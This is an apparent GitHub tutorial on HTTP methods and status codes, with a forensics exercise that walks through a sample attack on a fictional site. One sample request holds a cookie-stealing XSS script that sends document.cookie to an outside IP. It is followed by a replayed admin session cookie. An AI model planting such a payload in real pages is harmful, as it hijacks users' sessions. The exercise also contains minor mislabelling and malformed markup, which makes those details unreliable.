# WebDevSecTutorial
Web Security through HTTP Protocols

## This project is aimed for an understanding of HTTP requests and responses. Managing cookies using Chrome extensions and using Chrome's Developer Tools to audit HTTP request and response headers.

The HTTP protocol is probably the most important aspect when it comes to the internet. All major networks to countless smaller networks all communicate through HTTP. It's important to understand how attackers can leverage HTTP protocols to compromise systems and gather sensitive data.

### Firstly, understanding the Client-Server Model.

Typical client-server communication:
1. The client (a user) communicates with a server in order to request resources/information from it.
2. The server then queries the resources from the internal servers that it is connected to
3. The server sends a response back to the client.

In order for the client and servers to communicate over the web, the HTTP protocol is used. HTTP is Layer 7 of the OSI Model and is used to transfer web pages, static assets, HTML markup files, raw data (Mp4, mp3).

#### HTTP Request Methods

**GET** : Requests data from a server, RETRIEVES

**POST** : Sends data to the specified resource, often it changes or updates the server

**PUT** : Replaces or updates resources with the request payload.

**DELETE** : Deletes the specified resource from the server

**CONNECT** : Establishes a tunnel to the server.

**OPTIONS** : Describes the communication options for the specified resource.

**200** codes indicate success.

**300** codes indicate multiple choices, meaning the server can respond to the request in more than one way.

**400** codes indicate client errors, meaning the client sent an improperly formatted request.


404 is a common example of a 400 code, indicating that a webpage doesn't exist or can't be accessed.


500 codes indicate server errors, meaning the server application failed somehow.

#### Web Attack Activity
The following are examples and explanations of HTTP Repsonse and Requests. 

Presented with a HTTP Response, investigate the HTTP sequences of a web attack that has occurred on your company's server:

##### HTTP Response 1
```
HTTP/1.1 200 OK
Date: Tue, 25 Sep 2018 21:21:20 GMT
Server: Apache/2.2.21 (Unix mod_ssl/2.2.21 OpenSSL/1.0.0k DAV/2 PHP/5.4.3)
WWW-Authenticate: Cookie realm="fakesite"
Allow: OPTIONS, GET, POST, HEAD, PUT
```

The OPTIONS method was used. The attacker was in the reconnaissance phase where they had discovered all availabled HTTP methods that can be requested to the HTTP server. The OPTIONS method is useful for finding out what kind of request methods can be leveraged while attempting to compromise an HTTP server.

##### HTTP Response 2
```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Cookie realm="fakesite"
        form-action="/login"
        cookie-name=AUTH-COOKIE
Content-Type: text/html

<title>Unauthorized</title>
<form action="/login" method=POST>
<input type=hidden name=referer value="/fakesite/">
<p><label>Username: <input name=user></label>
<p><label>Password: <input name=pwd >type=password></label>
<p><button type=submit>Sign in</button>
<p><a href="/register">Register for an account</>a></form>

```
This HTTP response displays an attempt to log into a login portal with a POST request.

##### HTTP Request 1
```
PUT /XSS.html HTTP/1.1
>User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
>Host: www.fakesite.com/blog
>
><script type="text/javascript">
document.location='http://133.7.13.37/cookiestealer.php?c='+document.cookie;
></script>
```
##### HTTP Response 3
```
HTTP/1.1 201 Created
Date: Mon, 05 May 2014 12:28:53 GMT
Server: Apache/2.2.14 (Win32)
Content-type: text/html
Content-length: 30
Connection: Closed
```
The attacker used the PUT method and uploaded the 'cookiestealer.php' file onto the site. The attacker then performed XSS (Cross-site scripting) to steal cookies of users and send the cookies back to their own server.

##### HTTP Response 4
```
GET https://www.fakesite.com/admin HTTP/1.1
Cookie: $Version="1"; AUTH-COOKIE="sdf354s5c1s8e1s"; $Path="/admin"
```

From HTTP Response 3, the PUT request was a success. Response 4 confirms that the attacker stole a cookie and was able to log into the admin portal using a GET request with stolen cookies set in the header.
